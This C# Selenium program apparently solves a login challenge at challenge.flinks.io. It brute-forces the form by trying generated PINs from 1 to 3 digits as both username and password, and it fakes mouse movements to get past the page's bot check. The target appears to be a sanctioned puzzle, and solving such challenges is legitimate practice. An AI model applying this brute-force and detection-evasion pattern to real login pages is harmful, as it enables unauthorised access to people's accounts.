using System;
using System.Collections.Generic;
using System.Linq;
using System.Threading;
using System.Threading.Tasks;
using OpenQA.Selenium;
using OpenQA.Selenium.Chrome;
using OpenQA.Selenium.Interactions;
using OpenQA.Selenium.Support.UI;

namespace FlinksLogin
{
    class Program
    {        
        static void Main(string[] args)
        {
            var automatedLoginService = new AutomatedLoginService();
            automatedLoginService.Login();
        }
    }

    public class AutomatedLoginService
    {
        private static readonly string FlinksUrl = $"https://challenge.flinks.io";
        private static string ChallengeId;

        // twice the amount in case some events are missed
        private static readonly int MinimumOccurenceMouseMove = 10 * 2;

        private readonly IWebDriver _driver;
        private IList<string> _passwordDictionary;
        private IList<string> _loginDictionary;
        
        //only needed in case login I need to continue on a different challenge id (username password not rotated)
        private static string _currentLogin = string.Empty;
        
        public AutomatedLoginService()
        {
            // HACK: make driver's path
            _driver = new ChromeDriver(@"/Users/Aymeric/00-Sources/flinks/FlinksLogin/bin/Debug/netcoreapp2.1");
            _driver.Url = FlinksUrl;
            
            _passwordDictionary = GeneratePasswords();
            _loginDictionary = GeneratePasswords();
        }

        public void Login()
        {
            // For debugging purposes (in case username/password are not specific to the session, who knows...)
            var toSkip = _loginDictionary.IndexOf(_currentLogin);
            _loginDictionary = _loginDictionary.Skip(toSkip).ToList();

            NavigateToLogin();

            ForceLogin();

            var test = "";
        }

        private void ForceLogin()
        {
            Console.WriteLine($"starting forcelogin... - {DateTime.Now.ToLongTimeString()}");
            
            foreach (var login in _loginDictionary)
            {
                Console.WriteLine($"login attempt with {login} - {DateTime.Now.ToLongTimeString()}");
                
                // try same login/password
                var isLoginSuccessful = TryLogin(login, login);
                if (isLoginSuccessful)
                {
                    return;
                }
            }
            
        }

        private bool TryLogin(string login, string password)
        {
            _currentLogin = login;
            
            var retryCount = 0;

            while (true)
            {
                try
                {
                    return LoginAttempt(login, password);
                }
                catch (WebDriverException)
                {
                    retryCount++;

                    Console.WriteLine($"attempt #{retryCount} to login with {login} / {password} timed out - {DateTime.Now.ToLongTimeString()}");
                    
                    if (retryCount < 5)
                    {
                        Thread.Sleep(TimeSpan.FromSeconds(10));
                    }
                    else
                    {
                        throw;
                    }
                }
            }
        }

        private bool LoginAttempt(string login, string password)
        {
            // Source code seems to demand a certain amount of mouse move
            // if (numberOfOccurenceMove == 10) { ... }
            MoveMouseRandomly();

            var usernameField = _driver.FindElement(By.Name("username"));
            var passwordField = _driver.FindElement(By.Name("password"));

            usernameField.Click();
            usernameField.SendKeys(login);

            passwordField.Click();
            passwordField.SendKeys(password);

            passwordField.Submit();

            var loginResultTitle = _driver.FindElement(By.CssSelector("h4")).Text;

            var areCredentialsWrong = loginResultTitle.ToUpper().Contains("WRONG CREDENTIAL");
            var areYouBruteForcing = loginResultTitle.ToUpper().Contains("STOP BRUTE FORCING");

            if (areYouBruteForcing)
            {
                Console.WriteLine($"Brute Forcing - {login} {password} - {DateTime.Now.ToLongTimeString()}");
                Console.ReadLine();
            }
            else if (!areCredentialsWrong)
            {
                Console.WriteLine($"SUCCESS!! {login} {password} - {DateTime.Now.ToLongTimeString()}");
                Console.ReadLine();
                return true;
            }

            return false;
        }

        private void NavigateToLogin()
        {
            var start = _driver.FindElement(By.LinkText("START"));
            var href = start.GetAttribute("href");

            var startIndex = href.LastIndexOf('/');
            ChallengeId = href.Substring(startIndex + 1, href.Length - startIndex - 1);
            start.Click();
        }

        private void MoveMouseRandomly()
        {
            var action = new Actions(_driver);
            var rand = new Random();

            var occurenceMove = 0;
            while (occurenceMove < 2 * MinimumOccurenceMouseMove)
            {
                var x = rand.Next(-100, 100);
                var y = rand.Next(-100, 100);

                action.MoveByOffset(x, y);
                occurenceMove++;
            }
        }

        private IList<string> GeneratePasswords()
        {
            // 0 to 4 digits pin with values 1,2 or 3
            // 3^0 + 3^1 + 3^2 + 3^3 + 3^4 = 121 (to be verified with a calc)
            var passwords = new List<string>();
            passwords.Add(string.Empty);    // special case with no digits

            var currentLength = 0;

            while (currentLength < 4)
            {
                var longestPasswords = passwords.Where(x => x.Length == currentLength).ToList();
                foreach (var password in longestPasswords)
                {
                    var i = 1;
                    while (i < 4)
                    {
                        passwords.Add(password + i);
                        i++;
                    }
                }

                currentLength++;
            }

            return passwords;
        }
    }
}